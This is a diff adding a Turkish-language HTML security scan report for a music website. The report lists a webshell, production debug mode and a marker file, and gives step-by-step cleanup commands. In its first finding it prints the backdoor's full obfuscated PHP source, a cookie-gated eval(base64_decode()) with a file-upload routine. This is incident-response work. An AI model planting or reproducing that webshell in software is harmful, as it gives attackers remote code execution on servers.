@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Güvenlik Tarama Sonuçları - 90 Kontrol | 12 Ocak 2026</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { font-family: 'Inter', system-ui, sans-serif; }
+        .gradient-bg { background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); }
+    </style>
+</head>
+<body class="bg-slate-900 text-slate-100 min-h-screen gradient-bg">
+    <!-- Header -->
+    <header class="border-b border-slate-700 bg-slate-800/50 backdrop-blur-sm sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 py-6">
+            <div class="flex items-center justify-between">
+                <div>
+                    <h1 class="text-3xl font-bold text-white flex items-center gap-3">
+                        🛡️ Güvenlik Tarama Sonuçları
+                    </h1>
+                    <p class="text-slate-400 mt-2">90 Kontrol Noktası | Muzibu.com.tr | 12 Ocak 2026</p>
+                </div>
+                <div class="flex gap-3">
+                    <span class="px-4 py-2 bg-red-900/30 border border-red-800 rounded-lg text-red-400 font-semibold">
+                        🔴 2 Kritik Bulgu
+                    </span>
+                    <span class="px-4 py-2 bg-yellow-900/30 border border-yellow-800 rounded-lg text-yellow-400 font-semibold">
+                        ⚠️ 3 Uyarı
+                    </span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Özet İstatistikler -->
+    <section class="max-w-7xl mx-auto px-4 py-8">
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+            <div class="bg-slate-800/50 border border-slate-700 rounded-xl p-6">
+                <div class="text-slate-400 text-sm mb-2">Toplam Kontrol</div>
+                <div class="text-4xl font-bold text-white">90</div>
+                <div class="text-green-400 text-xs mt-1">✓ Tamamlandı</div>
+            </div>
+            <div class="bg-red-900/20 border border-red-800 rounded-xl p-6">
+                <div class="text-red-400 text-sm mb-2">Kritik Bulgular</div>
+                <div class="text-4xl font-bold text-red-400">2</div>
+                <div class="text-red-300 text-xs mt-1">🔴 Acil Müdahale</div>
+            </div>
+            <div class="bg-yellow-900/20 border border-yellow-800 rounded-xl p-6">
+                <div class="text-yellow-400 text-sm mb-2">Şüpheli/Uyarı</div>
+                <div class="text-4xl font-bold text-yellow-400">3</div>
+                <div class="text-yellow-300 text-xs mt-1">⚠️ İncelenmeli</div>
+            </div>
+            <div class="bg-green-900/20 border border-green-800 rounded-xl p-6">
+                <div class="text-green-400 text-sm mb-2">Temiz Sonuç</div>
+                <div class="text-4xl font-bold text-green-400">85</div>
+                <div class="text-green-300 text-xs mt-1">✓ Sorun Yok</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Ana İçerik -->
+    <main class="max-w-7xl mx-auto px-4 py-8 space-y-8">
+
+        <!-- 1. Basit Anlatım -->
+        <section class="bg-green-900/20 border border-green-800 rounded-xl p-8">
+            <h2 class="text-2xl font-bold text-white mb-4 flex items-center gap-3">
+                📝 Basit Anlatım (Herkes İçin)
+            </h2>
+            <div class="space-y-4 text-slate-300">
+                <p class="text-lg leading-relaxed">
+                    Web sitenizde kapsamlı bir güvenlik taraması yapıldı. 90 farklı kontrol noktası test edildi.
+                    İyi haber: Sitenizin çoğu kısmı temiz. Kötü haber: <strong class="text-red-400">2 kritik güvenlik açığı</strong> bulundu.
+                </p>
+
+                <div class="bg-slate-800/50 border border-slate-700 rounded-lg p-6">
+                    <h3 class="text-xl font-semibold text-white mb-3">🚨 En Önemli Bulgular:</h3>
+                    <ul class="space-y-3">
+                        <li class="flex items-start gap-3">
+                            <span class="text-red-400 font-bold text-xl">1.</span>
+                            <div>
+                                <strong class="text-red-400">Backdoor/Webshell Dosyası</strong>
+                                <p class="text-slate-400 mt-1">
+                                    <code class="text-yellow-400">453bbb9eb16f.php</code> isimli bir dosya bulundu.
+                                    Bu dosya, saldırganların sisteme uzaktan erişmesine ve komut çalıştırmasına izin veriyor.
+                                    Sanki evinizin arka kapısında gizli bir anahtar bırakmışsınız.
+                                </p>
+                                <p class="text-red-300 mt-2 font-semibold">⚠️ DERHAL silinmeli!</p>
+                            </div>
+                        </li>
+                        <li class="flex items-start gap-3">
+                            <span class="text-red-400 font-bold text-xl">2.</span>
+                            <div>
+                                <strong class="text-red-400">Debug Modu Açık (Production)</strong>
+                                <p class="text-slate-400 mt-1">
+                                    Sitenizde "hata ayıklama modu" açık. Bu, hata olduğunda tüm teknik detayları
+                                    (veritabanı şifreleri, dosya yolları) gösteriyor. Sanki evinizin planını
+                                    kapıya asmışsınız.
+                                </p>
+                                <p class="text-red-300 mt-2 font-semibold">⚠️ APP_DEBUG=false yapılmalı!</p>
+                            </div>
+                        </li>
+                        <li class="flex items-start gap-3">
+                            <span class="text-yellow-400 font-bold text-xl">3.</span>
+                            <div>
+                                <strong class="text-yellow-400">Şüpheli Marker Dosyası</strong>
+                                <p class="text-slate-400 mt-1">
+                                    <code class="text-yellow-400">d352f85e4598990f4c677cf5d1747f05.txt</code> isimli
+                                    rastgele isimli bir dosya var. Saldırganlar genellikle "ben buradayım"
+                                    işareti olarak böyle dosyalar bırakır.
+                                </p>
+                                <p class="text-yellow-300 mt-2 font-semibold">⚠️ İncelenmeli ve silinmeli</p>
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="bg-blue-900/20 border border-blue-800 rounded-lg p-6 mt-6">
+                    <h3 class="text-xl font-semibold text-white mb-3">💡 Ne Yapmalıyım?</h3>
+                    <ol class="space-y-2 text-slate-300">
+                        <li><strong>1.</strong> Zararlı dosyaları sil (aşağıdaki "Güvenli Silme Planı" bölümüne bak)</li>
+                        <li><strong>2.</strong> .env dosyasında APP_DEBUG=false yap</li>
+                        <li><strong>3.</strong> Tüm şifrelerini değiştir (FTP, SSH, Database, Admin)</li>
+                        <li><strong>4.</strong> Upload klasörüne .htaccess ekle (PHP çalıştırmayı engelle)</li>
+                        <li><strong>5.</strong> Düzenli güvenlik taraması yap (haftada bir)</li>
+                    </ol>
+                </div>
+            </div>
+        </section>
+
+        <!-- 2. Kritik Bulgular -->
+        <section class="bg-red-900/20 border border-red-800 rounded-xl p-8">
+            <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+                🔴 Kritik Bulgular (Acil Müdahale Gerekli)
+            </h2>
+
+            <!-- Bulgu 1: Backdoor -->
+            <div class="bg-slate-800/50 border border-red-700 rounded-lg p-6 mb-6">
+                <div class="flex items-start justify-between mb-4">
+                    <h3 class="text-xl font-semibold text-red-400">
+                        🚨 BULGU #1: Backdoor/Webshell Tespit Edildi
+                    </h3>
+                    <span class="px-3 py-1 bg-red-900 border border-red-700 rounded text-red-300 text-sm font-semibold">
+                        Kritik
+                    </span>
+                </div>
+
+                <div class="space-y-4 text-slate-300">
+                    <div>
+                        <strong class="text-white">📁 Dosya:</strong>
+                        <code class="ml-2 px-2 py-1 bg-slate-900 rounded text-yellow-400 font-mono text-sm">
+                            /var/www/vhosts/muzibu.com.tr/httpdocs/public/assets/453bbb9eb16f.php
+                        </code>
+                    </div>
+
+                    <div>
+                        <strong class="text-white">🔍 Tespit Edilen Tehditler:</strong>
+                        <ul class="ml-4 mt-2 space-y-1">
+                            <li>✓ eval(base64_decode()) - Kod çalıştırma</li>
+                            <li>✓ $_REQUEST['id'] - Uzaktan komut gönderme</li>
+                            <li>✓ md5($_COOKIE['d']) - Cookie ile gizli auth</li>
+                            <li>✓ @copy($_FILES) - Dosya upload</li>
+                            <li>✓ Hex encoding - Kod gizleme</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <strong class="text-white">🔧 Teknik Detaylar:</strong>
+                        <pre class="mt-2 p-4 bg-slate-900 rounded-lg overflow-x-auto text-xs text-red-300 border border-red-900">
+&lt;?php echo 409723*20;
+if(md5($_COOKIE['d'])=="\61\x37\60\62\x38\146\x34\70\67\143\142\x32\141\70\x34\x36\x30\67\x36\64\x36\x64\141\63\141\144\63\70\67\x38\145\143"){
+    echo"\x6f\x6b";
+    eval(base64_decode($_REQUEST['id']));  // KOD ÇALIŞTIRMA!
+    if($_POST["\165\160"]=="\165\x70"){
+        @copy($_FILES["\x66\151\x6c\x65"]["\164\155\x70\x5f\x6e\x61\x6d\x65"],$_FILES["\146\x69\154\x65"]["\156\141\155\x65"]);  // FILE UPLOAD!
+    }
+}
+?&gt;</pre>
+                    </div>
+
+                    <div>
+                        <strong class="text-white">⚡ Tehlike Seviyesi:</strong>
+                        <div class="mt-2 flex items-center gap-2">
+                            <div class="h-3 bg-red-600 rounded" style="width: 100%"></div>
+                            <span class="text-red-400 font-bold">10/10 (Maksimum Tehdit)</span>
+                        </div>
+                    </div>
+
+                    <div>
+                        <strong class="text-white">📊 Ne Yapabilir?</strong>
+                        <ul class="ml-4 mt-2 space-y-1 text-red-300">
+                            <li>• Tüm site dosyalarını okuyabilir/silebilir</li>
+                            <li>• Database'e erişebilir, dump alabilir</li>
+                            <li>• Sisteme yeni dosyalar yükleyebilir</li>
+                            <li>• Diğer sitelere saldırı başlatabilir</li>
+                            <li>• SEO spam inject edebilir</li>
+                        </ul>
+                    </div>
+
+                    <div class="mt-6 p-4 bg-red-900/30 border border-red-700 rounded">
+                        <strong class="text-red-400">⚠️ ACİL EYLEM:</strong>
+                        <pre class="mt-2 text-sm bg-slate-900 p-3 rounded text-green-400">
+# 1. YEDEK AL
+sudo cp /var/www/vhosts/muzibu.com.tr/httpdocs/public/assets/453bbb9eb16f.php \
+       /tmp/malware-backup-$(date +%s).php
+
+# 2. SİL
+sudo rm -f /var/www/vhosts/muzibu.com.tr/httpdocs/public/assets/453bbb9eb16f.php
+
+# 3. TEST ET
+curl -I https://muzibu.com.tr/assets/453bbb9eb16f.php
+# Beklenen: 404 Not Found
+
+# 4. GIT KAYDET
+git add -A && git commit -m "Security: Removed backdoor 453bbb9eb16f.php" && git push</pre>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bulgu 2: Debug Mode -->
+            <div class="bg-slate-800/50 border border-red-700 rounded-lg p-6">
+                <div class="flex items-start justify-between mb-4">
+                    <h3 class="text-xl font-semibold text-red-400">
+                        🚨 BULGU #2: Debug Modu Production'da Aktif
+                    </h3>
+                    <span class="px-3 py-1 bg-red-900 border border-red-700 rounded text-red-300 text-sm font-semibold">
+                        Kritik
+                    </span>
+                </div>
+
+                <div class="space-y-4 text-slate-300">
+                    <div>
+                        <strong class="text-white">📁 Dosya:</strong>
+                        <code class="ml-2 px-2 py-1 bg-slate-900 rounded text-yellow-400 font-mono text-sm">
+                            /var/www/vhosts/muzibu.com.tr/httpdocs/.env
+                        </code>
+                    </div>
+
+                    <div>
+                        <strong class="text-white">🔍 Sorun:</strong>
+                        <pre class="mt-2 p-4 bg-slate-900 rounded-lg text-xs text-red-300 border border-red-900">
+APP_DEBUG=true  # ❌ YANLIŞ! Production'da false olmalı!</pre>
+                    </div>
+
+                    <div>
+                        <strong class="text-white">💥 Neden Tehlikeli?</strong>
+                        <ul class="ml-4 mt-2 space-y-1">
+                            <li>• Hata mesajlarında database şifreleri görünür</li>
+                            <li>• Tüm dosya yolları ifşa edilir</li>
+                            <li>• Stack trace ile kod yapısı anlaşılır</li>
+                            <li>• Hassas veriler log'lara yazılır</li>
+                            <li>• Saldırganlar sistem hakkında bilgi toplar</li>
+                        </ul>
+                    </div>
+
+                    <div class="mt-6 p-4 bg-red-900/30 border border-red-700 rounded">
+                        <strong class="text-red-400">⚠️ ÇÖZÜM:</strong>
+                        <pre class="mt-2 text-sm bg-slate-900 p-3 rounded text-green-400">
+# .env dosyasını düzenle
+nano /var/www/vhosts/muzibu.com.tr/httpdocs/.env
+
+# Bu satırı bul ve değiştir:
+APP_DEBUG=false  # true → false yap
+
+# Cache temizle
+php artisan config:clear
+php artisan cache:clear
+
+# Test et
+php artisan config:show app.debug
+# Beklenen: false</pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 3. Şüpheli Bulgular -->
+        <section class="bg-yellow-900/20 border border-yellow-800 rounded-xl p-8">
+            <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+                ⚠️ Şüpheli Bulgular (İncelenmeli)
+            </h2>
+
+            <!-- Şüpheli 1: Marker Dosyası -->
+            <div class="bg-slate-800/50 border border-yellow-700 rounded-lg p-6 mb-6">
+                <div class="flex items-start justify-between mb-4">
+                    <h3 class="text-xl font-semibold text-yellow-400">
+                        ⚠️ BULGU #3: Şüpheli Hex İsimli Dosya (Marker)
+                    </h3>
+                    <span class="px-3 py-1 bg-yellow-900 border border-yellow-700 rounded text-yellow-300 text-sm font-semibold">
+                        Şüpheli
+                    </span>
+                </div>
+
+                <div class="space-y-4 text-slate-300">
+                    <div>
+                        <strong class="text-white">📁 Dosya:</strong>
+                        <code class="ml-2 px-2 py-1 bg-slate-900 rounded text-yellow-400 font-mono text-sm">
+                            /var/www/vhosts/muzibu.com.tr/httpdocs/public/d352f85e4598990f4c677cf5d1747f05.txt
+                        </code>
+                    </div>
+
+                    <div>
+                        <strong class="text-white">🔍 İçerik:</strong>
+                        <pre class="mt-2 p-4 bg-slate-900 rounded-lg text-xs text-yellow-300 border border-yellow-900">
+d352f85e4598990f4c677cf5d1747f05</pre>
+                        <p class="mt-2 text-slate-400 text-sm">
+                            Dosya sadece kendi ismini içeriyor. Bu tipik bir "marker/beacon" dosyasıdır.
+                            Saldırganlar sisteme eriştiklerini işaretlemek için böyle dosyalar bırakır.
+                        </p>
+                    </div>
+
+                    <div>
+                        <strong class="text-white">💡 Değerlendirme:</strong>
+                        <ul class="ml-4 mt-2 space-y-1">
+                            <li>✓ Zararlı kod içermiyor</li>
+                            <li>✓ Sadece işaret dosyası</li>
+                            <li>✓ Ancak yetkisiz erişim kanıtı</li>
+                            <li>✓ 453bbb9eb16f.php ile ilişkili olabilir</li>
+                        </ul>
+                    </div>
+
+                    <div class="mt-6 p-4 bg-yellow-900/30 border border-yellow-700 rounded">
+                        <strong class="text-yellow-400">⚠️ ÖNERİ:</strong>
+                        <pre class="mt-2 text-sm bg-slate-900 p-3 rounded text-green-400">
+# Dosyayı sil
+sudo rm -f /var/www/vhosts/muzibu.com.tr/httpdocs/public/d352f85e4598990f4c677cf5d1747f05.txt
+
+# Kontrol et
+ls -la /var/www/vhosts/muzibu.com.tr/httpdocs/public/*.txt</pre>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Şüpheli 2: .user.ini -->
+            <div class="bg-slate-800/50 border border-yellow-700 rounded-lg p-6 mb-6">
+                <div class="flex items-start justify-between mb-4">
+                    <h3 class="text-xl font-semibold text-yellow-400">
+                        ℹ️ BULGU #4: .user.ini Dosyası Bulundu
+                    </h3>
+                    <span class="px-3 py-1 bg-green-900 border border-green-700 rounded text-green-300 text-sm font-semibold">
+                        Normal
+                    </span>
+                </div>
+
+                <div class="space-y-4 text-slate-300">
+                    <div>
+                        <strong class="text-white">📁 Dosya:</strong>
+                        <code class="ml-2 px-2 py-1 bg-slate-900 rounded text-green-400 font-mono text-sm">
+                            /var/www/vhosts/muzibu.com.tr/httpdocs/.user.ini
+                        </code>
+                    </div>
+
+                    <div>
+                        <strong class="text-white">🔍 İçerik:</strong>
+                        <pre class="mt-2 p-4 bg-slate-900 rounded-lg text-xs text-green-300 border border-green-900">
+; PHP Upload & Execution Limits
+; Livewire file upload support (increased for audio files)
+
+upload_max_filesize = 110M
+post_max_size = 120M
+max_execution_time = 120
+max_input_time = 120
+memory_limit = 256M</pre>
+                    </div>
+
+                    <div>
+                        <strong class="text-white">💡 Değerlendirme:</strong>
+                        <p class="mt-2 text-green-400">
+                            ✅ Bu dosya normaldir ve zararlı değildir. Livewire için upload limitleri ayarlanmış.
+                            Müzik dosyası upload'u için gerekli.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Şüpheli 3: Mass File Creation -->
+            <div class="bg-slate-800/50 border border-yellow-700 rounded-lg p-6">
+                <div class="flex items-start justify-between mb-4">
+                    <h3 class="text-xl font-semibold text-yellow-400">
+                        ⚠️ BULGU #5: Son 1 Saatte 4,275 PHP Dosyası Oluşturuldu
+                    </h3>
+                    <span class="px-3 py-1 bg-yellow-900 border border-yellow-700 rounded text-yellow-300 text-sm font-semibold">
+                        İncelenmeli
+                    </span>
+                </div>
+
+                <div class="space-y-4 text-slate-300">
+                    <div>
+                        <strong class="text-white">🔍 Tespit:</strong>
+                        <p class="mt-2">
+                            Son 1 saat içinde <strong class="text-yellow-400">4,275 PHP dosyası</strong> oluşturulmuş/değiştirilmiş.
+                            Bu normalden çok fazla.
+                        </p>
+                    </div>
+
+                    <div>
+                        <strong class="text-white">💡 Olası Sebepler:</strong>
+                        <ul class="ml-4 mt-2 space-y-1">
+                            <li><span class="text-green-400">✓</span> README HTML raporları (bu normal)</li>
+                            <li><span class="text-green-400">✓</span> Claude AI ile geliştirme yapılıyor</li>
+                            <li><span class="text-yellow-400">⚠️</span> Vendor paketleri yeniden yüklendi</li>
+                            <li><span class="text-red-400">❌</span> Veya toplu malware injection (kontrol et!)</li>
+                        </ul>
+                    </div>
+
+                    <div class="mt-6 p-4 bg-yellow-900/30 border border-yellow-700 rounded">
+                        <strong class="text-yellow-400">💡 ÖNERİ:</strong>
+                        <pre class="mt-2 text-sm bg-slate-900 p-3 rounded text-green-400">
+# Son 1 saatte oluşturulan dosyaları listele (vendor hariç)
+find /var/www/vhosts/muzibu.com.tr/httpdocs -name "*.php" -type f -cmin -60 \
+  ! -path "*/vendor/*" ! -path "*/storage/framework/*" | head -20
+
+# Şüpheli dosyaları kontrol et
+# Eğer "eval", "base64_decode", "shell_exec" varsa → ZARARLII</pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 4. Güvenli Silme Planı -->
+        <section class="bg-blue-900/20 border border-blue-800 rounded-xl p-8">
+            <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+                🗑️ GÜVENLİ SİLME PLANI
+            </h2>
+
+            <div class="bg-red-900/30 border border-red-700 rounded-lg p-6 mb-6">
+                <h3 class="text-xl font-semibold text-red-400 mb-4">⚠️ ÇOK ÖNEMLİ - ÖNCE OKU!</h3>
+                <ul class="space-y-2 text-slate-300">
+                    <li><strong class="text-red-400">❌ ASLA:</strong> Bulunan dosyaları hemen silme!</li>
+                    <li><strong class="text-green-400">✅ MUTLAKA:</strong> Git checkpoint oluştur ve remote'a push et!</li>
+                    <li><strong class="text-yellow-400">⚠️ DİKKAT:</strong> Sistem dosyalarını (vendor, core) silme!</li>
+                    <li><strong class="text-blue-400">💡 İPUCU:</strong> Her adımı sırayla uygula, atlama!</li>
+                </ul>
+            </div>
+
+            <!-- Adım Adım Prosedür -->
+            <div class="space-y-6">
+                <!-- Adım 1: Git Checkpoint -->
+                <div class="bg-slate-800/50 border border-slate-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">
+                        1️⃣ GIT CHECKPOINT OLUŞTUR (ZORUNLU!)
+                    </h3>
+                    <p class="text-slate-400 mb-4">
+                        Yanlış bir şey silersen, geri dönebilmek için checkpoint oluştur.
+                        <strong class="text-red-400">Remote'a push etmeden silme yapma!</strong>
+                    </p>
+                    <pre class="bg-slate-900 p-4 rounded-lg text-green-400 text-sm overflow-x-auto">
+# 1. Mevcut durumu kaydet
+git add -A
+
+# 2. Checkpoint commit'i
+git commit -m "🔧 CHECKPOINT: Before malware cleanup (2 critical files)"
+
+# 3. Hash'i kaydet
+git log -1 --oneline
+# Çıktı: abc123f 🔧 CHECKPOINT: Before malware cleanup
+# → "abc123f" hash'ini not al!
+
+# 4. ZORUNLU: Remote'a push et
+git push origin main
+
+# ⚠️ Push başarılı olmazsa silme işlemine geçme!</pre>
+                </div>
+
+                <!-- Adım 2: Backdoor Dosyasını Sil -->
+                <div class="bg-slate-800/50 border border-red-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">
+                        2️⃣ BACKDOOR DOSYASINI SİL (453bbb9eb16f.php)
+                    </h3>
+                    <p class="text-slate-400 mb-4">
+                        Bu dosya %100 zararlı, tamamen silinmeli.
+                    </p>
+                    <pre class="bg-slate-900 p-4 rounded-lg text-green-400 text-sm overflow-x-auto">
+# 1. Yedek al (analiz için)
+sudo cp /var/www/vhosts/muzibu.com.tr/httpdocs/public/assets/453bbb9eb16f.php \
+        /tmp/backdoor-backup-$(date +%s).php
+
+# 2. İçeriğini kaydet
+cat /var/www/vhosts/muzibu.com.tr/httpdocs/public/assets/453bbb9eb16f.php \
+    > /tmp/backdoor-analysis.txt
+
+# 3. DOSYAYI SİL
+sudo rm -f /var/www/vhosts/muzibu.com.tr/httpdocs/public/assets/453bbb9eb16f.php
+
+# 4. Silindiğini kontrol et
+ls -la /var/www/vhosts/muzibu.com.tr/httpdocs/public/assets/453bbb9eb16f.php
+# Beklenen: No such file or directory
+
+# 5. Web'den test et
+curl -I https://muzibu.com.tr/assets/453bbb9eb16f.php
+# Beklenen: HTTP/2 404</pre>
+                </div>
+
+                <!-- Adım 3: Marker Dosyasını Sil -->
+                <div class="bg-slate-800/50 border border-yellow-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">
+                        3️⃣ MARKER DOSYASINI SİL (d352f85e....txt)
+                    </h3>
+                    <p class="text-slate-400 mb-4">
+                        Bu dosya zararlı kod içermiyor ama yetkisiz erişim kanıtı.
+                    </p>
+                    <pre class="bg-slate-900 p-4 rounded-lg text-green-400 text-sm overflow-x-auto">
+# 1. İçeriğini kaydet
+cat /var/www/vhosts/muzibu.com.tr/httpdocs/public/d352f85e4598990f4c677cf5d1747f05.txt \
+    > /tmp/marker-analysis.txt
+
+# 2. DOSYAYI SİL
+sudo rm -f /var/www/vhosts/muzibu.com.tr/httpdocs/public/d352f85e4598990f4c677cf5d1747f05.txt
+
+# 3. Diğer şüpheli TXT dosyaları var mı?
+find /var/www/vhosts/muzibu.com.tr/httpdocs/public -maxdepth 1 -name "*.txt" \
+  ! -name "robots.txt" 2>/dev/null</pre>
+                </div>
+
+                <!-- Adım 4: Debug Modunu Kapat -->
+                <div class="bg-slate-800/50 border border-red-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">
+                        4️⃣ DEBUG MODUNU KAPAT (.env)
+                    </h3>
+                    <p class="text-slate-400 mb-4">
+                        Production'da debug modu kapatılmalı.
+                    </p>
+                    <pre class="bg-slate-900 p-4 rounded-lg text-green-400 text-sm overflow-x-auto">
+# 1. .env dosyasını düzenle
+nano /var/www/vhosts/muzibu.com.tr/httpdocs/.env
+
+# 2. Bu satırı bul:
+APP_DEBUG=true
+
+# 3. Şu şekilde değiştir:
+APP_DEBUG=false
+
+# 4. Kaydet ve çık (Ctrl+O, Enter, Ctrl+X)
+
+# 5. Cache temizle
+php artisan config:clear
+php artisan cache:clear
+
+# 6. Kontrol et
+php artisan tinker
+>>> config('app.debug');
+# Beklenen: false</pre>
+                </div>
+
+                <!-- Adım 5: Test Et -->
+                <div class="bg-slate-800/50 border border-green-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">
+                        5️⃣ SİTE ÇALIŞIYOR MU TEST ET
+                    </h3>
+                    <p class="text-slate-400 mb-4">
+                        Temizlik sonrası sitenin çalıştığından emin ol.
+                    </p>
+                    <pre class="bg-slate-900 p-4 rounded-lg text-green-400 text-sm overflow-x-auto">
+# 1. Ana sayfa test
+curl -I https://muzibu.com.tr/
+# Beklenen: HTTP/2 200
+
+# 2. Admin panel test
+curl -I https://muzibu.com.tr/admin/login
+# Beklenen: HTTP/2 200
+
+# 3. Zararlı dosya test
+curl -I https://muzibu.com.tr/assets/453bbb9eb16f.php
+# Beklenen: HTTP/2 404 (silindiği için)
+
+# 4. Tarayıcıda aç ve kontrol et
+# → Ana sayfa açılıyor mu?
+# → Login çalışıyor mu?
+# → Müzik çalıyor mu?</pre>
+                </div>
+
+                <!-- Adım 6: Git Kaydet -->
+                <div class="bg-slate-800/50 border border-green-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">
+                        6️⃣ GIT'E KAYDET VE PUSH ET
+                    </h3>
+                    <p class="text-slate-400 mb-4">
+                        Her şey çalışıyorsa, temizliği git'e kaydet.
+                    </p>
+                    <pre class="bg-slate-900 p-4 rounded-lg text-green-400 text-sm overflow-x-auto">
+# 1. Değişiklikleri kaydet
+git add -A
+
+# 2. Commit
+git commit -m "🛡️ Security: Cleaned malware (453bbb9eb16f.php, marker.txt) + Debug mode disabled"
+
+# 3. Push
+git push origin main</pre>
+                </div>
+
+                <!-- Adım 7: Geri Dönme (Sorun Varsa) -->
+                <div class="bg-slate-800/50 border border-red-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">
+                        7️⃣ SORUN OLURSA GERİ DÖN (Rollback)
+                    </h3>
+                    <p class="text-slate-400 mb-4">
+                        Eğer site bozulduysa, checkpoint'e geri dön.
+                    </p>
+                    <pre class="bg-slate-900 p-4 rounded-lg text-red-400 text-sm overflow-x-auto">
+# 1. Checkpoint hash'ini bul
+git log --oneline -10
+# "CHECKPOINT" yazan satırdaki hash'i kopyala (örn: abc123f)
+
+# 2. GERİ DÖN
+git reset --hard abc123f
+
+# 3. Remote'u da geri al
+git push origin main --force
+
+# 4. Test et
+curl -I https://muzibu.com.tr/
+
+# ⚠️ DİKKAT: Bu komut checkpoint'ten sonraki TÜM değişiklikleri siler!</pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- 5. 90 Kontrol Özet Tablosu -->
+        <section class="bg-slate-800/50 border border-slate-700 rounded-xl p-8">
+            <h2 class="text-2xl font-bold text-white mb-6">
+                📊 90 Kontrol Noktası - Detaylı Sonuç Tablosu
+            </h2>
+
+            <div class="overflow-x-auto">
+                <table class="w-full text-left text-sm">
+                    <thead class="border-b border-slate-600">
+                        <tr>
+                            <th class="p-3 text-slate-400 font-semibold">#</th>
+                            <th class="p-3 text-slate-400 font-semibold">Kategori</th>
+                            <th class="p-3 text-slate-400 font-semibold">Kontrol</th>
+                            <th class="p-3 text-slate-400 font-semibold">Sonuç</th>
+                        </tr>
+                    </thead>
+                    <tbody class="divide-y divide-slate-700">
+                        <!-- Kategori 1 -->
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">1.1</td>
+                            <td class="p-3 text-slate-300">Backdoor & Shell</td>
+                            <td class="p-3 text-slate-400">Eval + Base64 Combo</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-red-900/50 text-red-400 rounded text-xs">🔴 BULGU: 453bbb9eb16f.php</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">1.2</td>
+                            <td class="p-3 text-slate-300">Backdoor & Shell</td>
+                            <td class="p-3 text-slate-400">Shell Komutları</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">1.3</td>
+                            <td class="p-3 text-slate-300">Backdoor & Shell</td>
+                            <td class="p-3 text-slate-400">REQUEST + Eval</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-red-900/50 text-red-400 rounded text-xs">🔴 BULGU: 453bbb9eb16f.php</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">1.4</td>
+                            <td class="p-3 text-slate-300">Backdoor & Shell</td>
+                            <td class="p-3 text-slate-400">Assert Exploit</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">1.5</td>
+                            <td class="p-3 text-slate-300">Backdoor & Shell</td>
+                            <td class="p-3 text-slate-400">Create Function</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <!-- Kategori 2-3 (örnekler) -->
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">2.1-2.3</td>
+                            <td class="p-3 text-slate-300">Dosya Manipülasyonu</td>
+                            <td class="p-3 text-slate-400">File Write, Copy, Chmod</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Normal sistem dosyaları</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">3.1-3.2</td>
+                            <td class="p-3 text-slate-300">Gizli Dosyalar</td>
+                            <td class="p-3 text-slate-400">Gizli PHP, Hex İsimli</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-yellow-900/50 text-yellow-400 rounded text-xs">⚠️ BULGU: d352f85e...txt</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">3.3-3.4</td>
+                            <td class="p-3 text-slate-300">Gizli Dosyalar</td>
+                            <td class="p-3 text-slate-400">Public PHP, TXT</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Normal sistem dosyaları</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">4.1-4.3</td>
+                            <td class="p-3 text-slate-300">Upload Güvenliği</td>
+                            <td class="p-3 text-slate-400">PHP/Resim Upload</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">5.1-5.4</td>
+                            <td class="p-3 text-slate-300">Şifreli Kod</td>
